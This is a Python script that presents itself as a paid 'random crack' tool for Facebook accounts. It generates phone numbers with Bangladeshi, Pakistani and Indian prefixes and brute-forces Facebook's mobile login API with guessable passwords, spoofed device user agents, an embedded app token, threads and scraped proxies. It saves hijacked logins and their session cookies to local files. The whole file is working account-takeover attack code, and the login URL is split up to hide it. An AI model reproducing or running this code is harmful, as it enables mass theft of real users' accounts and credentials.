# Converted for Linux: replaced 'requests' with a stdlib urllib helper
# and replaced '/sdcard/...' paths with local files.

import os, time, random, string, re, sys, json, uuid
import urllib.request, urllib.parse, urllib.error
import ssl
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# --- Minimal requests-like helper using urllib ---
class _Response:
    def __init__(self, code, body_bytes):
        self.status_code = code
        self._body = body_bytes
        try:
            self.text = body_bytes.decode('utf-8', errors='replace')
        except:
            self.text = str(body_bytes)
    def json(self):
        try:
            return json.loads(self.text)
        except:
            return {}

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

_ssl_context = ssl.create_default_context()

def get(url, params=None, headers=None, timeout=10):
    if params:
        query = urllib.parse.urlencode(params)
        sep = '&' if '?' in url else '?'
        url = f"{url}{sep}{query}"
    req = urllib.request.Request(url, headers=headers or {}, method='GET')
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_context) as resp:
            body = resp.read()
            return _Response(resp.getcode(), body)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, 'read') else b''
        return _Response(e.code if hasattr(e, 'code') else 0, body)
    except Exception as e:
        return _Response(0, str(e).encode('utf-8'))

def post(url, data=None, json_data=None, headers=None, timeout=10, allow_redirects=True):
    headers = dict(headers or {})
    if json_data is not None:
        body = json.dumps(json_data).encode('utf-8')
        headers.setdefault('Content-Type', 'application/json')
    elif data is not None:
        if isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode('utf-8')
            headers.setdefault('Content-Type', 'application/x-www-form-urlencoded')
        else:
            body = data if isinstance(data, (bytes, bytearray)) else str(data).encode('utf-8')
    else:
        body = None
    req = urllib.request.Request(url, data=body, headers=headers, method='POST')
    try:
        if allow_redirects:
            with urllib.request.urlopen(req, timeout=timeout, context=_ssl_context) as resp:
                body = resp.read()
                return _Response(resp.getcode(), body)
        else:
            opener = urllib.request.build_opener(_NoRedirect)
            resp = opener.open(req, timeout=timeout)
            body = resp.read()
            return _Response(resp.getcode(), body)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, 'read') else b''
        return _Response(e.code if hasattr(e, 'code') else 0, body)
    except Exception as e:
        return _Response(0, str(e).encode('utf-8'))
# --- end helper ---

gtxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","G[...]")
gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT[...]")
try:
    os.system("pkg install espeak")
except:
    pass
os.system("git pull")
try:
    proxylist = get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('socksku.txt','w').write(proxylist)
except Exception as e:
    pass
proxsi=open('socksku.txt','r').read().splitlines()
B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\33[m'
ugen=[]
ugtn=[]
ugxn=[] 
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192",[...])
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
dt="•"
id
ok=[]
cp=[]
twf=[]
lop=0
xode=[]
plist=[]
cpx=[]
cokix=[]
apkx=[]
paswtrh = []
rcd=[]
rcdx=[]
version="1.07"
def line():
    print(40*"=")
BDX=f"{W}BD SIM CODE : {G}017 015 018 019 013 016{E}{W}"
INDX=f"{W}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}"
PAKX=f"{W}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}"
LIMITX=f"EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}"
CPG=f"[{G}+{W}] Do you went show cp account (y/n)"
CKIG=f"[{G}+{W}] Do you went show cookie (y/n)"
chc=f'{W}[{G}+{E}] Choice : {G}'
flp=f"{W}[{G}•{W}] PUT FILE PATH\033[1;37m : {G}"
chcps=f'EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}'
mxxt=f'{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]'
nflp=f"[{R}!{W}] FILE LOCATION NOT FOUND "
try:
    os.system('espeak -a 300 "well,come to, HAVENT TOLLS"')
except:
    pass
def logo():
    os.system('clear');print(f"""\r\r\x1b[1;97m{W}
===================
𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐎𝐖𝐍𝐖𝐄 @𝐅𝐅𝐊𝐈𝐍𝐆𝟎𝟎𝟏𝟏
𝐅𝐑𝐄𝐄 𝐅𝐈𝐑𝐄 𝐈𝐃 𝐂𝐋𝐎𝐍𝐄 𝟕𝟎% 𝐋𝐎𝐆𝐈𝐍𝐆 𝟏𝟎𝟎%✔️
𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐈𝐃 𝐂𝐋𝐎𝐍𝐄 𝟑𝟎% 𝟐𝟎𝟏𝟔/𝟏7/𝟏8/𝟏9/𝟐0✔️
𝐖𝐎𝐑𝐊𝐈𝐍𝐆 𝐃𝐀𝐓𝐀 𝟏𝟎𝟎% 𝐖𝐈𝐅𝐈 𝟏𝟎𝟎% ✔️
𝐏𝐀𝐈𝐃 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐍𝐄𝐄𝐃 𝐈𝐍 𝐁𝐎𝐗 𝐒𝐌𝐒✔️
𝐔𝐏𝐃𝐀𝐓𝐄 𝐋𝐈𝐅𝐄 𝐓𝐈𝐌𝐄 𝐖𝐎𝐑𝐊𝐈𝐍𝐆✔️
𝐁𝐎𝐗-𝐁𝐃-𝐂𝐘𝐁𝐄𝐑-𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘-𝟎𝟒𝟗𝟗 𝐓𝐄𝐀𝐌✔️
===================\x1b[1;97m""")
def Main():
    logo()
    print(f' {W}[{G}A{W}]{W} RANDOM CRACK [{G}BANGLADESH{W}]');print(f' {W}[{G}B{W}]{W} RANDOM CRACK [{G}PAKISTAN{W}]');print(f' {W}[{G}C{W}]{W} RANDOM CRACK [{G}INDIA{W}]')
    line()
    ghx=input(f' [{G}+{W}] Choice : {G}')
    if ghx in ["A","a","1"]:rcd.append(f'1');rmenu1()
    elif ghx in ["B","b","2"]:rcd.append(f'2');rmenu1()
    elif ghx in ["C","c","3"]:rcd.append(f'3');rmenu1()
    else:line();print(f'\n \t {R}Choose valid option{E}');time.sleep(1);Main()
def rmenu1():
    logo()
    if "1" in rcd:print(f"{BDX}");line()
    if "2" in rcd:print(f"{PAKX}");line()
    if "3" in rcd:print(f"{INDX}");line()
    code=input(f'{chc}');print(f"{W}{40*'='}")
    print(f'{LIMITX}');line()
    limit=int(input(f'[{G}+{E}] Limit : {G}'))
    print(f"{W}{40*'='}");print(f'{CPG}');line()
    cx=input(f'[{chc}')
    if cx in ['n','N','no','NO','2']:cpx.append(f'n')
    else:cpx.append(f'y')
    print(f"{W}{40*'='}");print(f'{CKIG}');line()
    ckiv=input(f'{chc}')
    if ckiv in ['n','N','no','NO','2']:cokix.append(f'n')
    else:cokix.append(f'y')
    for number in range(limit):
        if "1" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(8));xode.append(numberx)
        if "2" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(7));xode.append(numberx)
        if "3" in rcd:numberx = ''.join(random.choice(string.digits) for _ in range(6));xode.append(numberx)
    with ThreadPool(max_workers=60) as tonxoys:
        tid= str(len(xode))
        logo();print(f' [{G}•{W}] TOTAL ID :\033[1;92m '+tid);print (f' {W}[{G}•{W}] \033[1;97mSIM CODE : \033[1;92m'+code);print(f' {W}[{G}•{W}] \033[1;37mTHE PROCESS HAS BEEN STARTED');print(f'[...]
        for rngx in xode:
            id=code+rngx
            if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
            if "2" in rcd:psd=[id,rngx,id[5:],"khan123"]
            if "3" in rcd:psd=[id,rngx,id[:6],"57273200"]
            tonxoys.submit(graphrm,id,psd,tid)
lk=[]
def graphrm(id,psd,tid):
    global ok,cp,lk,lop
    togg=[]
    sys.stdout.write(f'\r\r{BG}[{W}@FF_KING0011{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
    for psw in psd:
        #ua=ua1()
        vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150));VAPP = random.randint(410000000,499999999);gtt=random.choice(xxxxx);gttt=random.choice(xx[...])
        ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;F[...]
        datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','[...]
        header={'User-Agent': ua,'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-N[...]
        twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
        lo = post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False).json()
        if 'session_key' in lo:
            cki = lo["session_cookies"]
            ck={}
            for xk in cki:ck.update({xk["name"]:xk["value"]})
            coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
            iid= re.findall('c_user=(.*);xs', coki)[0]
            print(f'\r\r{G}[EMRAN-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('EHC-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
            if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🥠{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
            break
        elif twfx in str(lo):
            iid = lo['error']['error_data']['uid']
            print(f'\r\r{BL}[Havent Tools-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('EHC-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
            twf.append(id)
            break
        elif 'www.facebook.com' in lo.get('error', {}).get('message', ''):
            try:
                iid = lo['error']['error_data']['uid']
            except:
                iid=id
            if iid in ok:pass
            else:
                if 'y' in cpx:
                    print(f'\r\r{R}[Havent Tools-PAID-SCRIPT] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
            break
        else:
            continue
    lop+=1

Main()
#paid sc 1500 tk
